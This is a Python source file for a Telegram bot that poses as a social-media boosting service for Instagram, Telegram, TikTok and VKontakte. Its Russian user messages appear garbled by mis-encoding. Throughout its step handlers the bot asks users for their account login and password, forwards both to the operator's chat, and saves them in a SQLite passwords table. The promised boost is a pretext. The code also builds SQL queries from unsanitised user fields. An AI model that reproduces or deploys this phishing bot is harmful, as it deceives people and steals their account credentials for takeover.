from pathlib import Path
from config import *
import traceback
import datetime
import logging
import sqlite3
import time
import sys
import os

from telebot import types
import telebot


BASE_DIR = Path(sys.argv[0]).parent
LOGS_DIR = BASE_DIR.joinpath("Logs")
DB_FILE = BASE_DIR.joinpath("data.db")
os.chdir(BASE_DIR)


os.makedirs(LOGS_DIR, exist_ok=True)
logs_file = LOGS_DIR.joinpath(datetime.datetime.now().strftime("%d_%m_%Y") + ".log")

logs = os.listdir(LOGS_DIR)
if len(logs) > 15:
    for item in reversed(logs):
        try:
            os.remove(LOGS_DIR.joinpath(item))
            break
        except:
            print(traceback.format_exc())
            continue
logs = []

logger = logging.getLogger()
logging_format = '%(asctime)s : %(name)s : %(levelname)s : %(message)s'
logging.basicConfig(
    level=logging.INFO,
    format=logging_format
)
try:
    fh = logging.FileHandler(
        logs_file,
        encoding='utf-8'
    )
except:
    try:
        fh = logging.FileHandler(
            logs_file
        )
    except:
        print(traceback.format_exc())
        os._exit(0)
fh.setFormatter(logging.Formatter(logging_format))
logger.addHandler(fh)


connection = sqlite3.connect(DB_FILE, check_same_thread=False)
cursor = connection.cursor()

cursor.execute("""CREATE TABLE IF NOT EXISTS users (username TEXT, id INTEGER, first_name TEXT, last_name TEXT)""")
cursor.execute("""CREATE TABLE IF NOT EXISTS passwords (platform TEXT, id INTEGER, login TEXT, password TEXT)""")
connection.commit()

bot = telebot.TeleBot(TOKEN)
try:
    bot.send_message(ID, "‚ùáÔ∏è –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!") 
except:
    logger.error(traceback.format_exc())


def get_emodji(name: str) -> str:
    if name == "Instagram":
        return name + "üì∏"
    elif name == "Telegram":
        return name + "‚úâÔ∏è"
    elif name == "Tiktok":
        return name + "üì±"
    elif name == "VKontakte":
        return name + "üíé"
    else:
        return name


@bot.message_handler(commands=["start"], chat_types=["private"])
def start(message: types.Message):
    cursor.execute(f"SELECT id FROM users WHERE id = {message.from_user.id}")
    if cursor.fetchone() == None:
        logger.error(f"–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å!\nID: {message.from_user.id}")

        cursor.execute(f"""INSERT INTO users VALUES ('{message.from_user.username}', {message.from_user.id}, '{message.from_user.first_name}', '{message.from_user.last_name}')""")
        connection.commit()

        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("–ù–∞—á–∞—Ç—å!", callback_data="start"))

        _text="""
üëã –ü—Ä–∏–≤–µ—Ç!
–≠—Ç–æ –±–æ—Ç –ø—Ä–æ–¥–≤–∏–∂–µ–Ω–∏—è –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ –≤ —Å–æ—Ü. —Å–µ—Ç—è—Ö!
–ß—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å, –≤–≤–µ–¥–∏—Ç–µ /farm –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ!
                            üëáüëáüëáüëáüëáüëáüëáüëáüëáüëá"""
        bot.send_message(message.chat.id, _text, reply_markup=markup)
    else:
        main_command(message)


@bot.message_handler(commands=["farm", "nakrutka", "nakr", "ferm", "f", "nakrut"], chat_types=["private"])
def main_command(message: types.Message):
    markup = types.InlineKeyboardMarkup(row_width=2)

    names = ["Instagram", "Telegram", "Tiktok", "VKontakte"]
    for item in names:
        item1 = types.InlineKeyboardButton(get_emodji(item), callback_data=f"platform|{item}")
        markup.add(item1)
        
    bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –ø–ª–∞—Ç—Ñ–æ—Ä–º—É!", reply_markup=markup)


@bot.callback_query_handler(func=lambda call:True)
def callback_handler(call: types.CallbackQuery):
    author_id = call.message.chat.id

    if call.data == "start":
        try:
            bot.delete_message(author_id, call.message.id)
        except:
            logger.error(traceback.format_exc())
        main_command(call.message)

    elif call.data.startswith("like|"):
        try:
            bot.delete_message(author_id, call.message.id)
        except:
            logger.error(traceback.format_exc())
        platform = call.data.split("|")[1]

        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        markup.add(types.KeyboardButton("–û—Ç–º–µ–Ω–∞‚ùå"))
        
        msg = bot.send_message(author_id, "–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ (–Ω–µ –±–æ–ª–µ–µ 5000): ", reply_markup=markup)
        
        bot.register_next_step_handler(msg, proc_1, platform)

    elif call.data.startswith("platform|"):
        try:
            bot.delete_message(author_id, call.message.id)
        except:
            logger.error(traceback.format_exc())

        platform = call.data.split("|")[1]

        markup = types.InlineKeyboardMarkup(row_width=2)

        if platform in ["Instagram", "Tiktok", "VKontakte"]:
            item1 = types.InlineKeyboardButton(text="–õ–∞–π–∫–∏‚ù§Ô∏è", callback_data=f"like|{platform}")
            item2 = types.InlineKeyboardButton(text="–ü–æ–¥–ø–∏—Å—á–∏–∫–∏üìÉ", callback_data=f"like|{platform}")
            item3 = types.InlineKeyboardButton(text="–ü—Ä–æ—Å–º–æ—Ç—Ä—ãüëÅ‚Äçüó®", callback_data=f"like|{platform}")
            item4 = types.InlineKeyboardButton(text="–†–µ–ø–æ—Å—Ç—ãüì¨", callback_data=f"like|{platform}")
            markup.add(item1)
            markup.add(item2)
            markup.add(item3)
            markup.add(item4)
        elif platform == "Telegram":
            markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            markup.add(types.KeyboardButton("–û—Ç–º–µ–Ω–∞‚ùå"))
            
            msg = bot.send_message(author_id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ –≤–∞—à —Ç–µ–ª–µ–≥—Ä–∞–º–º –∫–∞–Ω–∞–ª –∏–ª–∏ –≥—Ä—É–ø–ø—É:", reply_markup=markup)
            
            bot.register_next_step_handler(msg, fake_channel, platform)
            return

        bot.send_message(author_id, "–í—ã–±–µ—Ä–∏—Ç–µ –ø—É–Ω–∫—Ç:", reply_markup=markup)


def fake_channel(message: types.Message, platform: str):
    if "–æ—Ç–º–µ–Ω–∞" in str(message.text).lower():
        markup = types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("–ú–µ–Ω—é!", callback_data=f"start")
        markup.add(item1)

        bot.reply_to(message, "–û–ø–µ—Ä–∞—Ü–∏—è –æ—Ç–º–µ–Ω–µ–Ω–∞! –ù–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ, —á—Ç–æ–±—ã –ø–æ–≤—Ç–æ—Ä–∏—Ç—å –ø–æ–ø—ã—Ç–∫—É!", reply_markup=markup)
        return
    
    if not "https://" in message.text and not "@" in message.text:
        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        markup.add(types.KeyboardButton("–û—Ç–º–µ–Ω–∞‚ùå"))
        
        msg = bot.reply_to(message, "‚ùå–û—à–∏–±–∫–∞! –°—Å—ã–ª–∫–∞ –Ω–µ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–∞!\n\n–í–≤–µ–¥–∏—Ç–µ –¥—Ä—É–≥–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ:", reply_markup=markup)
        
        bot.register_next_step_handler(msg, fake_channel, platform)
        return

    markup = types.InlineKeyboardMarkup()

    item1 = types.InlineKeyboardButton(text="–†–µ–∞–∫—Ü–∏–∏‚ù§Ô∏è", callback_data=f"like|{platform}")
    item2 = types.InlineKeyboardButton(text="–ü–æ–¥–ø–∏—Å—á–∏–∫–∏üìÉ", callback_data=f"like|{platform}")
    item3 = types.InlineKeyboardButton(text="–ü—Ä–æ—Å–º–æ—Ç—Ä—ãüëÅ‚Äçüó®", callback_data=f"like|{platform}")
    item4 = types.InlineKeyboardButton(text="–†–µ–ø–æ—Å—Ç—ãüì¨", callback_data=f"like|{platform}")
    markup.add(item1)
    markup.add(item2)
    markup.add(item3)
    markup.add(item4)

    bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –ø—É–Ω–∫—Ç:", reply_markup=markup)


def proc_1(message: types.Message, platform: str):
    try:
        num = str(message.text)
        
        if "–æ—Ç–º–µ–Ω–∞" in str(message.text).lower():
            markup = types.InlineKeyboardMarkup()
            item1 = types.InlineKeyboardButton("–ú–µ–Ω—é!", callback_data=f"start")
            markup.add(item1)

            bot.reply_to(message, "–û–ø–µ—Ä–∞—Ü–∏—è –æ—Ç–º–µ–Ω–µ–Ω–∞! –ù–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ, —á—Ç–æ–±—ã –ø–æ–≤—Ç–æ—Ä–∏—Ç—å –ø–æ–ø—ã—Ç–∫—É!", reply_markup=markup)
            return

        if not num.isdigit():
            markup = types.InlineKeyboardMarkup()
            item1 = types.InlineKeyboardButton("–ú–µ–Ω—é!", callback_data=f"platform|{platform}")
            markup.add(item1)

            bot.reply_to(message, "–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ù–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ, —á—Ç–æ–±—ã –ø–æ–≤—Ç–æ—Ä–∏—Ç—å –ø–æ–ø—ã—Ç–∫—É!", reply_markup=markup)
            return

        if int(num) > 5000:
            markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            markup.add(types.KeyboardButton("–û—Ç–º–µ–Ω–∞‚ùå"))
            
            msg = bot.reply_to(message, "‚ùå–û—à–∏–±–∫–∞! –ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 5000!\n\n–í–≤–µ–¥–∏—Ç–µ –¥—Ä—É–≥–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ:", reply_markup=markup)
            
            bot.register_next_step_handler(msg, proc_1, platform)
            return

        else:
            bot.send_message(message.chat.id, f"–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ: {num}")
            markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            markup.add(types.KeyboardButton("–û—Ç–º–µ–Ω–∞‚ùå"))

            msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –∏–ª–∏ –ø–æ—á—Ç—É –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:\n\n–ù–∞–ø—Ä–∏–º–µ—Ä: +79999999999 –∏–ª–∏ test@gmail.com", reply_markup=markup)
            bot.register_next_step_handler(msg, step_1, platform)

    except:
        logger.error(traceback.format_exc())


def step_1(message: types.Message, platform: str):
    if "–æ—Ç–º–µ–Ω–∞" in str(message.text).lower():
        markup = types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("–ú–µ–Ω—é!", callback_data=f"start")
        markup.add(item1)

        bot.reply_to(message, "–û–ø–µ—Ä–∞—Ü–∏—è –æ—Ç–º–µ–Ω–µ–Ω–∞! –ù–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ, —á—Ç–æ–±—ã –ø–æ–≤—Ç–æ—Ä–∏—Ç—å –ø–æ–ø—ã—Ç–∫—É...!", reply_markup=markup)
        return
    
    if not "+" in message.text and not "@" in message.text:
        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        markup.add(types.KeyboardButton("–û—Ç–º–µ–Ω–∞‚ùå"))
        
        msg = bot.send_message(message.chat.id, "[ERROR] –ö–∞–∂–µ—Ç—Å—è, —ç—Ç–æ –Ω–µ –ª–æ–≥–∏–Ω! –ï—Å–ª–∏ —ç—Ç–æ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –∑–Ω–∞–∫ '+' –ø–µ—Ä–µ–¥ —Ü–∏—Ñ—Ä–æ–≤—ã–º –∑–Ω–∞—á–µ–Ω–∏–µ–º.\n\n–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –∏–ª–∏ –ø–æ—á—Ç—É –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:", reply_markup=markup)
        
        bot.register_next_step_handler(msg, step_1, platform)
        return

    bot.send_message(ID, f"""–ü–æ–ª—É—á–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:	

–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: {platform}
ID: {message.from_user.id}
Username: @{message.from_user.username}
–õ–æ–≥–∏–Ω: <tg-spoiler>{message.text}</tg-spoiler>
–ò–º—è: {message.from_user.first_name}""", parse_mode='html')

    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton("–û—Ç–º–µ–Ω–∞‚ùå"))

    msg = bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:", reply_markup=markup)
    bot.register_next_step_handler(msg, step_2, platform, message.text)


def step_2(message: types.Message, platform: str, login: str):
    if "–æ—Ç–º–µ–Ω–∞" in str(message.text).lower():
        markup = types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("–ú–µ–Ω—é!", callback_data=f"start")
        markup.add(item1)

        bot.reply_to(message, "–û–ø–µ—Ä–∞—Ü–∏—è –æ—Ç–º–µ–Ω–µ–Ω–∞! –ù–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ, —á—Ç–æ–±—ã –ø–æ–≤—Ç–æ—Ä–∏—Ç—å –ø–æ–ø—ã—Ç–∫—É!", reply_markup=markup)
        return
    
    markup = types.ReplyKeyboardRemove()
    
    bot.send_message(ID, f"""–ü–æ–ª—É—á–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:

–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: {platform} 
ID: {message.from_user.id}
Username: @{message.from_user.username}
–õ–æ–≥–∏–Ω: <tg-spoiler>{login}</tg-spoiler>
–ü–∞—Ä–æ–ª—å: <tg-spoiler>{message.text}</tg-spoiler>
–ò–º—è: {message.from_user.first_name}""", parse_mode='html', reply_markup=markup)

    # data = {
    # 	"platform": platform,
    # 	"login": login,
    # 	"password": message.text,
    # 	"id": message.from_user.id,
    # 	"username": message.from_user.username,
    # 	"first_name": message.from_user.first_name,
    # 	"last_name": message.from_user.last_name
    # }

    try:
        cursor.execute(f"SELECT id FROM passwords WHERE id = {message.from_user.id} AND platform = '{platform}'")
        if cursor.fetchone() == None:
            cursor.execute(f"""INSERT INTO passwords VALUES ('{platform}', {message.from_user.id}, ?, ?)""", (login, message.text,))
        else:
            cursor.execute(f"""UPDATE passwords SET login = ?, password = ? WHERE id = {message.from_user.id}""", (login,message.text,))

        connection.commit()
    except:
        logger.error(traceback.format_exc())

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("–û–±—Ä–∞—Ç–Ω–æ!", callback_data="start"))

    bot.send_message(message.chat.id, f"–°–ø–∞—Å–∏–±–æ, —á—Ç–æ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏—Å—å –Ω–∞—à–∏–º —Å–µ—Ä–≤–∏—Å–æ–ºüòâ!\n–ï—Å–ª–∏ –≤–≤–µ–¥–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ, –æ–∂–∏–¥–∞–π—Ç–µ –Ω–∞–∫—Ä—É—Ç–∫—É –Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –≤ —Ç–µ—á–µ–Ω–∏–∏ 24 —á–∞—Å–æ–≤!", reply_markup=markup)


while True:
    try:
        bot.polling(none_stop=True)
    except:
        logger.error(traceback.format_exc())
        time.sleep(3)
        continue
